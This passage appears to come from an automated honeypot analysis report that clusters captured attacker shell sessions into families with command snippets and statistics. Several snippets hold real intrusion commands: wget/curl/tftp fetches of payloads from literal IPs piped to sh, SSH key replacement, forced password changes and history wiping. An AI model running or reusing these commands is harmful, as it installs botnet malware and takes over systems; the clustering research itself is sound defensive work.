Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=7e1e2f182d4d96c6` (session `1ce2a821e7dd`, n_rows=7)  

**Medoid commands (snippet):**

```bash
enable
system
shell
sh
linuxshell
cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
cd /tmp || cd /run || cd /; wget http://79.110.63.9/vcapsisabronzeplayer.sh; chmod 777 vcapsisabronzeplayer.sh; sh vcapsisabronzeplayer.sh ICUP; tftp 79.1 ...
```

Consensus (op, conn) pairs:

```python
[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('linuxshell', ';'), ('cd', ';'), ('echo', ';'), ('cat', ';'), ('rm', ';'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('history', 'EOS')]
```

Top operators: [('sh', 4), ('cd', 4), ('rm', 3), ('chmod', 3), ('tftp', 2), ('enable', 1), ('system', 1), ('shell', 1), ('linuxshell', 1), ('echo', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 7e1e2f182d4d96c6 | 1ce2a821e7dd |        7 |

## Family 103

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=8040a8db7b0eb168` (session `773f7b41b15c`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; wget 164.92.142.65/ez22 | curl -O 164.92.142.65/ez22; chmod 777 ez22; ./ez22; rm -rf ez22*; history -c; cd /tmp; wget http://2.56.57.98/mips | wget http://2.56.57.98/mipsel | wget http://2.56.57.98/sh4 | wget http://2.56.57.98/arm7 | wget http://2.56. ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('wget', '|'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('history', ';'), ('cd', ';'), ('wget', '|'), ('wget', '|'), ('wget', '|'), ('wget', '|'), ('wget', '|'), ('wget', '|'), ('wget', '|'), ('wget', ';'), ('PH_EXEC_2', ';'), ('rm', ';'), ('history', 'EOS')]
```

Top operators: [('wget', 9), ('cd', 2), ('rm', 2), ('history', 2), ('curl', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('PH_EXEC_2', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 8040a8db7b0eb168 | 773f7b41b15c |        1 |

## Family 147

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=849ac220bcb28000` (session `47134c0c4dce`, n_rows=105)  

**Medoid commands (snippet):**

```bash
echo
id
show version
echo
id
show version
LANG=C; echo $?
LANGUAGE=en; echo $?
LANG=C; LANGUAGE=en; echo ScanEnginePermissionElevationTest
LANG=C; LANGUAGE=en; uname -s; uname -r; uname -m; (uname -p || echo); uname -v
LANG=C; LANGUAGE=en; cat /etc/debian_rele ...
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('id', ';'), ('show', ';'), ('echo', ';'), ('id', ';'), ('show', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('uname', ';'), ('uname', ';'), ('uname', ';'), ('uname', '||'), ('echo', ';'), ('uname', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('vmware', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('id', ';'), ('PH_EXEC_1', '||'), ('PH_EXEC_2', ';'), ('PH_EXEC_3', '||'), ('PH_EXEC_4', ';'), ('dmidecode', '||'), ('PH_EXEC_5', '||'), ('PH_EXEC_6', '||'), ('PH_EXEC_7', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('curl', ';'), ('ps', '|'), ('awk', ';'), ('cat', ';'), ('show', ';'), ('get', ';'), ('show', ';'), ('version', ';'), ('get', ';'), ('uname', ';'), ('tmsh', ';'), ('tmsh', ';'), ('tmsh', ';'), ('list', ';'), ('show', ';'), ('show', ';'), ('show', ';'), ('show', ';'), ('show', ';'), ('b', ';'), ('show', ';'), ('lsof', '|'), ('grep', ';'), ('hostname', ';'), ('uname', ';'), ('command', ';'), ('command', ';'), ('grep', ';'), ('ps', '|'), ('grep', '|'), ('grep', ';'), ('test', ';'), ('cat', ';'), ('cat', ';'), ('java', ';'), ('grep', ';'), ('grep', ';'), ('get-tpm', ';'), ('mongod', ';'), ('rails', ';'), ('ffmpeg', ';'), ('cat', ';'), ('openssl', ';'), ('cat', ';'), ('kubectl', ';'), ('kubelet', ';'), ('cat', ';'), ('cat', ';'), ('netstat', ';'), ('lsof', ';'), ('docker', ';'), ('docker', ';'), ('docker', ';'), ('docker', ';'), ('cat', ';'), ('cat', ';'), ('ls', ';'), ('ls', ';'), ('ls', ';'), ('ls', ';'), ('test', '&&'), ('grep', '|'), ('grep', ';'), ('ls', ';'), ('ls', ';'), ('ls', ';'), ('ls', ';'), ('ls', ';'), ('test', ';'), ('bash', ';'), ('x', ';'), ('env', ';'), ('bash', '&&'), ('bash', '||'), ('echo', ';'), ('echo', ';'), ('bash', '&&'), ('bash', '&&'), ('bash', '|'), ('bash', '||'), ('echo', ';'), ('echo', ';'), ('mkdir', ';'), ('cd', '&&'), ('rm', ';'), ('echo', '|'), ('bash', ';'), ('cat', ';'), ('rm', 'EOS')]
```

Top operators: [('cat', 34), ('echo', 11), ('show', 10), ('ls', 9), ('grep', 8), ('bash', 8), ('uname', 7), ('docker', 4), ('id', 3), ('tmsh', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 849ac220bcb28000 | 47134c0c4dce |      105 |

## Family 83

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=85564d3b90c178e9` (session `0a4a70336c2c`, n_rows=1)  

**Medoid commands (snippet):**

```bash
id
```

Consensus (op, conn) pairs:

```python
[('id', 'EOS')]
```

Top operators: [('id', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 85564d3b90c178e9 | 0a4a70336c2c |        1 |

## Family 118

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=8a003c35ddd1bafb` (session `1a689c62bfde`, n_rows=22)  

**Medoid commands (snippet):**

```bash
cp /bin/echo /home/.z && >/home/.z && cd /home/; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d
cp /bin/echo /.z && >/.z && cd /; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d
cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; cp .z .i; cp .i .d; chmod 777 .i; chm ...
```

Consensus (op, conn) pairs:

```python
[('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('PH_EXEC_1', ';'), ('PH_EXEC_2', ';'), ('>', ';'), ('>', 'EOS')]
```

Top operators: [('cp', 27), ('echo', 23), ('chmod', 18), ('>', 11), ('cd', 9), ('PH_EXEC_1', 1), ('PH_EXEC_2', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 8a003c35ddd1bafb | 1a689c62bfde |       22 |

## Family 177

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=8bf1718631af57b8` (session `f139b1a18bbd`, n_rows=2)  

**Medoid commands (snippet):**

```bash
free -m
passwd
```

Consensus (op, conn) pairs:

```python
[('free', ';'), ('passwd', 'EOS')]
```

Top operators: [('free', 1), ('passwd', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 8bf1718631af57b8 | f139b1a18bbd |        2 |

## Family 50

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=9144cd9e8d0dece1` (session `b03fa3e51fa8`, n_rows=22)  

**Medoid commands (snippet):**

```bash
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYm ...
```

Consensus (op, conn) pairs:

```python
[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('PH_EXEC_1', ';'), ('>', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('PH_EXEC_1', ';'), ('>', 'EOS')]
```

Top operators: [('cp', 48), ('chmod', 34), ('cd', 20), ('rm', 18), ('>', 18), ('busybox', 6), ('echo', 4), ('wget', 4), ('wd1', 4), ('mkdir', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9144cd9e8d0dece1 | b03fa3e51fa8 |       22 |

## Family 112

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=92622a91f3dcc2ba` (session `0058ba83af20`, n_rows=2)  

**Medoid commands (snippet):**

```bash
command -v curl
ls /home
```

Consensus (op, conn) pairs:

```python
[('command', ';'), ('ls', 'EOS')]
```

Top operators: [('command', 1), ('ls', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 92622a91f3dcc2ba | 0058ba83af20 |        2 |

## Family 107

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=97f54ad68c7ecae9` (session `19f4c3106882`, n_rows=8)  

**Medoid commands (snippet):**

```bash
sh
shell
enable
cat /bin/echo || while read i; do echo $i; done < /proc/self/exe
sh
shell
enable
cat /bin/echo || while read i; do echo $i; done < /proc/self/exe
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('shell', ';'), ('enable', ';'), ('cat', '||'), ('read', ';'), ('echo', ';'), ('sh', ';'), ('shell', ';'), ('enable', ';'), ('cat', '||'), ('read', ';'), ('echo', 'EOS')]
```

Top operators: [('sh', 2), ('shell', 2), ('enable', 2), ('cat', 2), ('read', 2), ('echo', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 97f54ad68c7ecae9 | 19f4c3106882 |        8 |

## Family 91

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=9823047ab95dbd47` (session `000fa3796f7d`, n_rows=2)  

**Medoid commands (snippet):**

```bash
echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9823047ab95dbd47 | 000fa3796f7d |        2 |

## Family 92

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=98cac64e8f07bdb1` (session `09120e3e2e2b`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cp /bin/echo /tmp/ntpclient; >/tmp/ntpclient; chmod 777 /tmp/ntpclient
```

Consensus (op, conn) pairs:

```python
[('cp', ';'), ('>', ';'), ('chmod', 'EOS')]
```

Top operators: [('cp', 1), ('>', 1), ('chmod', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 98cac64e8f07bdb1 | 09120e3e2e2b |        1 |

## Family 157

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=9c44d7df2a9c16dd` (session `4eada8c2618a`, n_rows=1)  

**Medoid commands (snippet):**

```bash
ls
```

Consensus (op, conn) pairs:

```python
[('ls', 'EOS')]
```

Top operators: [('ls', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9c44d7df2a9c16dd | 4eada8c2618a |        1 |

## Family 108

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=9c4f4a254aeb99fa` (session `48cd52b8e860`, n_rows=3)  

**Medoid commands (snippet):**

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.105/onions1337; curl -O http://45.90.161.105/onions1337; chmod 777 onions1337; sh onions1337; tftp 45.90.161.105 -c get bins.sh; chmod 777 onions1337; sh onions1337; tftp -r .sh -g 45 ...
```

Consensus (op, conn) pairs:

```python
[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('ftpget', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('ftpget', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('ftpget', ';'), ('sh', ';'), ('rm', ';'), ('rm', 'EOS')]
```

Top operators: [('cd', 15), ('sh', 12), ('chmod', 9), ('tftp', 6), ('rm', 6), ('wget', 3), ('curl', 3), ('ftpget', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9c4f4a254aeb99fa | 48cd52b8e860 |        3 |

## Family 156

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=9f321abb08670ab3` (session `19777e7f057d`, n_rows=1)  

**Medoid commands (snippet):**

```bash
nproc
```

Consensus (op, conn) pairs:

```python
[('nproc', 'EOS')]
```

Top operators: [('nproc', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9f321abb08670ab3 | 19777e7f057d |        1 |

## Family 77

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=a17b1d9568f886ff` (session `001a3a29acc4`, n_rows=6)  

**Medoid commands (snippet):**

```bash
sh
enable
shell
debug shell
cmd
wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('enable', ';'), ('shell', ';'), ('debug', ';'), ('cmd', ';'), ('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', 'EOS')]
```

Top operators: [('sh', 3), ('enable', 1), ('shell', 1), ('debug', 1), ('cmd', 1), ('wget', 1), ('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| a17b1d9568f886ff | 001a3a29acc4 |        6 |

## Family 159

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=a34d629a02c11268` (session `0009b3b635ed`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
```

Consensus (op, conn) pairs:

```python
[('cat', 'EOS')]
```

Top operators: [('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| a34d629a02c11268 | 0009b3b635ed |        1 |

## Family 161

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=a4ba25aeae421f0f` (session `19bb4bcebba7`, n_rows=1)  

**Medoid commands (snippet):**

```bash
echo -n XSUCCESX && uname -a
```

Consensus (op, conn) pairs:

```python
[('echo', '&&'), ('uname', 'EOS')]
```

Top operators: [('echo', 1), ('uname', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| a4ba25aeae421f0f | 19bb4bcebba7 |        1 |

## Family 152

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=a5493342abd99d02` (session `01843fb14af8`, n_rows=6)  

**Medoid commands (snippet):**

```bash
wget -qO - http://113.106.167.11/x/1sh | sh > /dev/null 2>&1 &
rm -rf /var/run/1sh; wget -c http://113.106.167.11/x/1sh -P /var/run && sh /var/run/1sh &
wget -qO - http://113.106.167.11/x/2sh | sh > /dev/null 2>&1 &
rm -rf /tmp/2sh; wget -c http://113.106.167. ...
```

Consensus (op, conn) pairs:

```python
[('wget', '|'), ('sh', ';'), ('rm', ';'), ('wget', '&&'), ('sh', ';'), ('wget', '|'), ('sh', ';'), ('rm', ';'), ('wget', '&&'), ('sh', ';'), ('curl', '|'), ('sh', ';'), ('cd', ';'), ('rm', ';'), ('tftp', ';'), ('sh', 'EOS')]
```

Top operators: [('sh', 6), ('wget', 4), ('rm', 3), ('curl', 1), ('cd', 1), ('tftp', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| a5493342abd99d02 | 01843fb14af8 |        6 |

## Family 123

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=a7aeca69b0781802` (session `df52559ce012`, n_rows=3)  

**Medoid commands (snippet):**

```bash
cat /proc/mounts
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', 'EOS')]
```

Top operators: [('>', 2), ('cd', 2), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| a7aeca69b0781802 | df52559ce012 |        3 |

## Family 179

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=aae5773f80cc7acd` (session `03d094dda4e7`, n_rows=2)  

**Medoid commands (snippet):**

```bash
admin
curl http://10.10.10.10
```

Consensus (op, conn) pairs:

```python
[('admin', ';'), ('curl', 'EOS')]
```

Top operators: [('admin', 1), ('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| aae5773f80cc7acd | 03d094dda4e7 |        2 |

## Family 88

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=af899337ad4a2390` (session `aa3548cc421d`, n_rows=2)  

**Medoid commands (snippet):**

```bash
free
top
```

Consensus (op, conn) pairs:

```python
[('free', ';'), ('top', 'EOS')]
```

Top operators: [('free', 1), ('top', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| af899337ad4a2390 | aa3548cc421d |        2 |

## Family 58

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=b0a487ddc25556e1` (session `dc2cda278bf5`, n_rows=13)  

**Medoid commands (snippet):**

```bash
cat /proc/cpuinfo | grep name | wc -l
echo -e "admin\\nT1KKs2xv4yJm\\nT1KKs2xv4yJm" | passwd | bash
echo "admin\\nT1KKs2xv4yJm\\nT1KKs2xv4yJm\\n" | passwd
echo "321" > /var/tmp/.var03522123
crontab -l
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc  ...
```

Consensus (op, conn) pairs:

```python
[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('echo', '|'), ('passwd', ';'), ('echo', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('echo', 'EOS')]
```

Top operators: [('grep', 4), ('echo', 4), ('uname', 3), ('cat', 2), ('wc', 2), ('passwd', 2), ('bash', 1), ('crontab', 1), ('w', 1), ('top', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| b0a487ddc25556e1 | dc2cda278bf5 |       13 |

## Family 146

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=b759e6c04be52341` (session `074b48d28a34`, n_rows=1)  

**Medoid commands (snippet):**

```bash
uname -a; nproc; history -c
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('nproc', ';'), ('history', 'EOS')]
```

Top operators: [('uname', 1), ('nproc', 1), ('history', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| b759e6c04be52341 | 074b48d28a34 |        1 |

## Family 75

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=bd4821f227cd507c` (session `f933a2f8a536`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cat /bin/sh || cat /bin/busybox || cat /bin/bash
```

Consensus (op, conn) pairs:

```python
[('cat', '||'), ('cat', '||'), ('cat', 'EOS')]
```

Top operators: [('cat', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| bd4821f227cd507c | f933a2f8a536 |        1 |

## Family 114

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=c11613a0055e25e1` (session `f4fbb7387913`, n_rows=7)  

**Medoid commands (snippet):**

```bash
sh
enable
shell
debug shell
cmd
wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh
wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('enable', ';'), ('shell', ';'), ('debug', ';'), ('cmd', ';'), ('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', ';'), ('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', 'EOS')]
```

Top operators: [('sh', 5), ('wget', 2), ('curl', 2), ('enable', 1), ('shell', 1), ('debug', 1), ('cmd', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| c11613a0055e25e1 | f4fbb7387913 |        7 |

## Family 81

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=c6b6f4cf63d198f4` (session `0cba6b7851dc`, n_rows=3)  

**Medoid commands (snippet):**

```bash
uname -a
uname -a
uname -a
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('uname', ';'), ('uname', 'EOS')]
```

Top operators: [('uname', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| c6b6f4cf63d198f4 | 0cba6b7851dc |        3 |

## Family 149

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=c7572b0f120882d5` (session `28037ef63785`, n_rows=1)  

**Medoid commands (snippet):**

```bash
grep -c ^processor /proc/cpuinfo
```

Consensus (op, conn) pairs:

```python
[('grep', 'EOS')]
```

Top operators: [('grep', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| c7572b0f120882d5 | 28037ef63785 |        1 |

## Family 37

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=c79e5571b6ae60fd` (session `6a7217ce86f0`, n_rows=11)  

**Medoid commands (snippet):**

```bash
cat /proc/cpuinfo | grep name | wc -l
echo -e "admin\\n6HAMGVDtwYDi\\n6HAMGVDtwYDi" | passwd | bash
echo "admin\\n6HAMGVDtwYDi\\n6HAMGVDtwYDi\\n" | passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }'
free -m | grep Mem | awk '{ ...
```

Consensus (op, conn) pairs:

```python
[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]
```

Top operators: [('grep', 3), ('echo', 3), ('cat', 2), ('passwd', 2), ('awk', 2), ('cd', 2), ('wc', 1), ('bash', 1), ('head', 1), ('free', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| c79e5571b6ae60fd | 6a7217ce86f0 |       11 |

## Family 73

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=c99397799ddb8226` (session `057585d5974c`, n_rows=1)  

**Medoid commands (snippet):**

```bash
